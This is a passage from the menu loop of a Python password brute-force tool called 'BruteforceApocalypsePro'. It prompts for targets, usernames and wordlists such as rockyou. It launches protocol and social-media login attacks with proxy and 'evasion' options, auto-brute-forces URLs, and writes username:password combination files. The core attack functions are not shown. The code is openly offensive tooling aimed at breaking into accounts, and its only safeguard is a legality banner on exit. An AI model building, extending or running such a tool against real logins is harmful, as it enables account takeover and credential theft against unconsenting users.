                    f"Target: [red]{target}[/red]\n"
                    f"Username: [red]{username}[/red]\n"
                    f"Wordlist: [red]{wordlist}[/red]\n"
                    f"Threads: [yellow]{self.threads}[/yellow]\n"
                    f"Evasion Level: [magenta]{self.evasion_level}[/magenta]",
                    border_style="yellow"
                ))
                
                if not Confirm.ask("[red]⚠️ Start attack?[/red]"):
                    continue
                
                self.run_attack(target, protocol, username, wordlist)
                input("\nPress Enter to continue...")
            
            elif choice == '2':
                platform = self._select_social_media()
                target = Prompt.ask("[yellow]?[/yellow] Enter target URL (leave empty for default)", default="")
                
                if not target:
                    target = self.social_media[platform]['url']
                
                username = Prompt.ask("[yellow]?[/yellow] Enter username/email")
                
                wordlist = self.wordlists['rockyou']
                if Confirm.ask("[yellow]?[/yellow] Use custom wordlist?", default=False):
                    custom = Prompt.ask("[yellow]?[/yellow] Enter wordlist path")
                    if os.path.exists(custom):
                        wordlist = custom
                    else:
                        console.print("[red]✗ Wordlist file not found[/red]")
                        continue
                
                console.print(Panel.fit(
                    f"[bold]SOCIAL MEDIA ATTACK[/bold]\n"
                    f"Platform: [red]{platform.capitalize()}[/red]\n"
                    f"Target: [red]{target}[/red]\n"
                    f"Username: [red]{username}[/red]\n"
                    f"Wordlist: [red]{wordlist}[/red]",
                    border_style="yellow"
                ))
                
                if not Confirm.ask("[red]⚠️ Start attack?[/red]"):
                    continue
                
                self.run_attack(target, platform, username, wordlist)
                input("\nPress Enter to continue...")
            
            elif choice == '3':
                url = Prompt.ask("[yellow]?[/yellow] Enter target URL")
                self.auto_bruteforce(url)
                input("\nPress Enter to continue...")
            
            elif choice == '4':
                user_folder = Prompt.ask("[yellow]?[/yellow] Path to usernames folder")
                pass_folder = Prompt.ask("[yellow]?[/yellow] Path to passwords folder")
                
                users = []
                passwords = []
                
                if os.path.exists(user_folder):
                    for file in os.listdir(user_folder):
                        with open(os.path.join(user_folder, file), 'r', errors='ignore') as f:
                            users.extend([line.strip() for line in f if line.strip()])
                
                if os.path.exists(pass_folder):
                    for file in os.listdir(pass_folder):
                        with open(os.path.join(pass_folder, file), 'r', errors='ignore') as f:
                            passwords.extend([line.strip() for line in f if line.strip()])
                
                if not users or not passwords:
                    console.print("[red]✗ No valid usernames or passwords found[/red]")
                    input("\nPress Enter to continue...")
                    continue
                
                output_file = Prompt.ask("[yellow]?[/yellow] Output filename", default="combinations.txt")
                
                with open(output_file, 'w') as f:
                    for user in users:
                        for pwd in passwords:
                            f.write(f"{user}:{pwd}\n")
                
                console.print(f"[green]✓ Created {len(users)*len(passwords)} combinations in {output_file}[/green]")
                input("\nPress Enter to continue...")
            
            elif choice == '5':
                self._create_wordlist()
            
            elif choice == '6':
                self._proxy_manager()
            
            elif choice == '7':
                self._configure_attack()
            
            elif choice == '8':
                self._view_reports()
            
            elif choice == '0':
                console.print(Panel.fit(
                    "[blink bold red]⚠️ WARNING: UNAUTHORIZED USE IS ILLEGAL! ⚠️[/blink bold red]",
                    border_style="red"
                ))
                if Confirm.ask("[red]Are you sure you want to exit?[/red]"):
                    self._clear_screen()
                    sys.exit(0)
            
            self._clear_screen()
            self._show_banner()

if __name__ == "__main__":
    try:
        bruteforce = BruteforceApocalypsePro()
        bruteforce.run()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Interrupted by user[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Fatal error: {str(e)}[/red]")
        sys.exit(1)
